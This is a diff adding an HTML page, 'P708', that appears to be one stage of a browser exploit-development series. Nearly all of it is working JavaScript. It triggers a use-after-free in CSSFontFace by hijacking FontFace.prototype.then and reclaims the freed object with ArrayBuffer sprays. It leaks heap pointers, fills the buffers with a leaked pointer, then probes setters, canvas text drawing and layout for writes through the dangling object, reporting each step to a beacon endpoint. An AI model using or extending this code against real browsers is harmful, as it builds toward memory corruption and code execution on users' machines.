@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P708 — CSSFontFace setter + render scout</title>
+<script>
+'use strict';
+/* ============================================================
+ * P708 — CSSFontFace Setter & Render Scout
+ *
+ * P706 tested property READS on a dangling FontFace after
+ * CSSFontFace UAF + AB(192) reclaim. ALL reads returned cached
+ * JS-side values and ZERO writes hit the AB. The getters don't
+ * touch the C++ CSSFontFace.
+ *
+ * This probe tests what DOES touch the C++ CSSFontFace:
+ *
+ * Phase A: CSSFontFace UAF → AB(192) reclaim (proven, P704/P706)
+ * Phase B: Second UAF with P58-filled ABs (proven)
+ * Phase C: Property SETTERS — each writes through CSSFontFace
+ *          setFamily/setWeight/setStyle etc. which access the
+ *          freed C++ object (now our AB). Check for AB writes.
+ * Phase D: Re-add to document.fonts → triggers re-registration
+ * Phase E: measureText/fillText → font metric resolution through
+ *          the corrupted CSSFontFace
+ * Phase F: DOM layout with font applied → forces style resolution
+ *
+ * Each operation is isolated in try/catch with pre/post beacon
+ * so a crash still tells us which operation killed it.
+ *
+ * CRASH_CLASS: MODERATE — setters may fault on pointer deref
+ * ============================================================ */
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P708-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,600))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+function h16(v){ return ('0000000000000000'+BigInt(v).toString(16)).slice(-16); }
+
+var P58=null, P68=null;
+var FACE_B=null, BUF_B=null, VIEW_B=null;
+
+function snapAB(){
+  if(!VIEW_B) return [];
+  var s=[];
+  for(var q=0;q<24;q++) s.push(VIEW_B[q]);
+  return s;
+}
+function diffAB(pre){
+  if(!VIEW_B||!pre.length) return '';
+  var w=[];
+  for(var q=0;q<24;q++){
+    if(VIEW_B[q]!==pre[q]) w.push('q'+q+'=0x'+h16(VIEW_B[q]));
+  }
+  return w.length ? w.join(',') : 'none';
+}
+
+/* ---- Phase A: first FontFace UAF for address disclosure ---- */
+function phaseA(cb){
+  b('A-GO','');
+  var st=document.createElement('style');
+  st.textContent='@font-face{font-family:aa;src:local(Arial);unicode-range:U+42;}';
+  document.head.appendChild(st);
+  var fa=new FontFace('fa0','local(Helvetica)',{unicodeRange:'U+41'});
+  document.fonts.add(fa); void fa.loaded;
+
+  var abs=[], fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove();st.textContent='';st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<48;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em aa');}catch(e){}
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fa0, aa','AB');
+
+  setTimeout(function(){
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){ b('A-MISS','bestNz='+bestNz); return; }
+    var v64=new BigUint64Array(abs[best]);
+    P58=v64[11]; P68=v64[13];
+    b('A-HIT','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    delete FontFace.prototype.then;
+    setTimeout(function(){ cb(); }, 100);
+  }, 250);
+}
+
+/* ---- Phase B: second FontFace UAF with controlled fill ---- */
+function phaseB(cb){
+  if(!P58){ b('B-SKIP','no-p58'); return; }
+  b('B-GO','');
+
+  var st2=document.createElement('style');
+  st2.textContent='@font-face{font-family:bb;src:local(serif);unicode-range:U+43;}';
+  document.head.appendChild(st2);
+  FACE_B=new FontFace('fb0','local(Times)',{unicodeRange:'U+44'});
+  document.fonts.add(FACE_B); void FACE_B.loaded;
+
+  var abs2=[], fired2=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove();st2.textContent='';st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<48;k++){
+        var ab=new ArrayBuffer(192);
+        var v=new BigUint64Array(ab);
+        for(var q=0;q<24;q++) v[q]=P58;
+        abs2.push(ab);
+      }
+      try{document.fonts.check('1em bb');}catch(e){}
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fb0, bb','CD');
+
+  setTimeout(function(){
+    var best=-1, maxDiff=0;
+    for(var i=0;i<abs2.length;i++){
+      var v=new BigUint64Array(abs2[i]), diff=0;
+      for(var q=0;q<24;q++) if(v[q]!==P58) diff++;
+      if(diff>maxDiff){maxDiff=diff;best=i;}
+    }
+    if(best<0||maxDiff===0){ b('B-MISS',''); return; }
+    BUF_B=abs2[best]; VIEW_B=new BigUint64Array(BUF_B);
+    var changed=[];
+    for(var q=0;q<24;q++){
+      if(VIEW_B[q]!==P58) changed.push('q'+q+'=0x'+h16(VIEW_B[q]));
+    }
+    b('B-HIT','idx='+best+'|diff='+maxDiff+'|'+changed.join(','));
+    delete FontFace.prototype.then;
+    setTimeout(function(){ cb(); }, 100);
+  }, 250);
+}
+
+/* ---- Phase C: Property SETTERS ---- */
+function phaseC(cb){
+  if(!FACE_B||!VIEW_B){ b('C-SKIP','no-face'); cb(); return; }
+  b('C-GO','');
+
+  var setters=[
+    ['family','TestFam'],
+    ['style','italic'],
+    ['weight','bold'],
+    ['stretch','condensed'],
+    ['unicodeRange','U+0-FF'],
+    ['featureSettings','"liga" 1'],
+    ['display','swap']
+  ];
+
+  var i=0;
+  function next(){
+    if(i>=setters.length){ cb(); return; }
+    var name=setters[i][0], val=setters[i][1];
+    i++;
+    b('C-PRE-'+name.toUpperCase(),'');
+    var pre=snapAB();
+    var err=null, result=null;
+    try{ FACE_B[name]=val; result='ok'; }catch(e){
+      err=(e.name||'')+'|'+(e.message||'').slice(0,80);
+    }
+    var d=diffAB(pre);
+    if(err) b('C-'+name.toUpperCase(), 'ERR='+err+'|writes='+d);
+    else b('C-'+name.toUpperCase(), 'val='+result+'|writes='+d);
+
+    /* read back to see what the getter returns now */
+    try{
+      var rb=FACE_B[name];
+      b('C-'+name.toUpperCase()+'-RB', 'readback='+String(rb).slice(0,80));
+    }catch(e){
+      b('C-'+name.toUpperCase()+'-RB', 'ERR='+e.message);
+    }
+    setTimeout(next, 30);
+  }
+  next();
+}
+
+/* ---- Phase D: Re-add to document.fonts ---- */
+function phaseD(cb){
+  if(!FACE_B||!VIEW_B){ b('D-SKIP',''); cb(); return; }
+  b('D-PRE-ADD','');
+  var pre=snapAB();
+  try{
+    document.fonts.add(FACE_B);
+    b('D-ADD','ok|writes='+diffAB(pre));
+  }catch(e){
+    b('D-ADD','ERR='+(e.name||'')+'|'+(e.message||'').slice(0,100)+'|writes='+diffAB(pre));
+  }
+
+  /* check size and has */
+  try{
+    b('D-POST','size='+document.fonts.size+'|has='+document.fonts.has(FACE_B));
+  }catch(e){}
+
+  /* try document.fonts.load with the re-added face */
+  b('D-PRE-LOAD','');
+  pre=snapAB();
+  try{
+    var p=document.fonts.load('1em fb0','X');
+    b('D-LOAD','promise='+typeof p+'|writes='+diffAB(pre));
+  }catch(e){
+    b('D-LOAD','ERR='+e.message+'|writes='+diffAB(pre));
+  }
+
+  setTimeout(function(){ cb(); }, 200);
+}
+
+/* ---- Phase E: measureText + fillText through corrupted font ---- */
+function phaseE(cb){
+  if(!VIEW_B){ b('E-SKIP',''); cb(); return; }
+  b('E-GO','');
+  var cv=document.createElement('canvas'); cv.width=100; cv.height=50;
+  var cx=cv.getContext('2d');
+
+  /* measureText with fb0 */
+  b('E-PRE-MEASURE','');
+  var pre=snapAB();
+  try{
+    cx.font='24px fb0';
+    var m=cx.measureText('ABCD');
+    b('E-MEASURE','w='+m.width+'|writes='+diffAB(pre));
+  }catch(e){
+    b('E-MEASURE','ERR='+e.message+'|writes='+diffAB(pre));
+  }
+
+  /* fillText */
+  b('E-PRE-FILL','');
+  pre=snapAB();
+  try{
+    cx.fillStyle='red';
+    cx.fillText('ABCD',10,30);
+    b('E-FILL','ok|writes='+diffAB(pre));
+  }catch(e){
+    b('E-FILL','ERR='+e.message+'|writes='+diffAB(pre));
+  }
+
+  /* strokeText */
+  b('E-PRE-STROKE','');
+  pre=snapAB();
+  try{
+    cx.strokeText('EFGH',10,30);
+    b('E-STROKE','ok|writes='+diffAB(pre));
+  }catch(e){
+    b('E-STROKE','ERR='+e.message+'|writes='+diffAB(pre));
+  }
+
+  /* read back pixel data for non-zero (did it actually render?) */
+  try{
+    var px=cx.getImageData(0,0,100,50).data;
+    var nzp=0;
+    for(var j=0;j<px.length;j+=4) if(px[j]>0||px[j+1]>0||px[j+2]>0) nzp++;
+    b('E-PIXELS','nonzero='+nzp);
+  }catch(e){}
+
+  setTimeout(function(){ cb(); }, 100);
+}
+
+/* ---- Phase F: DOM layout with corrupted font ---- */
+function phaseF(){
+  if(!VIEW_B){ b('F-SKIP',''); b('DONE','p708-done'); return; }
+  b('F-GO','');
+
+  /* create a styled element that uses fb0 */
+  var div=document.createElement('div');
+  div.style.fontFamily='fb0, serif';
+  div.style.fontSize='20px';
+  div.textContent='Test text for font resolution XYZ';
+  document.body.appendChild(div);
+
+  b('F-PRE-LAYOUT','');
+  var pre=snapAB();
+
+  /* force layout */
+  try{
+    var r=div.getBoundingClientRect();
+    b('F-LAYOUT','w='+r.width+'|h='+r.height+'|writes='+diffAB(pre));
+  }catch(e){
+    b('F-LAYOUT','ERR='+e.message+'|writes='+diffAB(pre));
+  }
+
+  /* getComputedStyle */
+  b('F-PRE-COMPUTED','');
+  pre=snapAB();
+  try{
+    var cs=window.getComputedStyle(div);
+    b('F-COMPUTED','font='+cs.fontFamily+'|writes='+diffAB(pre));
+  }catch(e){
+    b('F-COMPUTED','ERR='+e.message+'|writes='+diffAB(pre));
+  }
+
+  /* offsetWidth/Height (forces reflow) */
+  pre=snapAB();
+  try{
+    var ow=div.offsetWidth, oh=div.offsetHeight;
+    b('F-REFLOW','ow='+ow+'|oh='+oh+'|writes='+diffAB(pre));
+  }catch(e){
+    b('F-REFLOW','ERR='+e.message+'|writes='+diffAB(pre));
+  }
+
+  /* final full AB dump */
+  var parts=[];
+  for(var q=0;q<24;q++){
+    if(VIEW_B[q]!==P58) parts.push('q'+q+'=0x'+h16(VIEW_B[q]));
+  }
+  b('FINAL','nChangedFromP58='+parts.length+'|'+parts.join(','));
+
+  /* byte-level diff from P58 fill */
+  var u8=new Uint8Array(BUF_B);
+  var p58bytes=new Uint8Array(new BigUint64Array([P58]).buffer);
+  var diffBytes=[];
+  for(var i=0;i<192;i++){
+    if(u8[i]!==p58bytes[i%8]) diffBytes.push(i);
+  }
+  b('FINAL-BYTES','nDiffBytes='+diffBytes.length+'|idx='+diffBytes.slice(0,40).join(','));
+
+  b('DONE','p708-complete');
+}
+
+/* ---- Main ---- */
+function run(){
+  b('BOOT','p708');
+  phaseA(function(){
+    phaseB(function(){
+      phaseC(function(){
+        phaseD(function(){
+          phaseE(function(){
+            phaseF();
+          });
+        });
+      });
+    });
+  });
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P708 — CSSFontFace setter + render scout</pre></body></html>
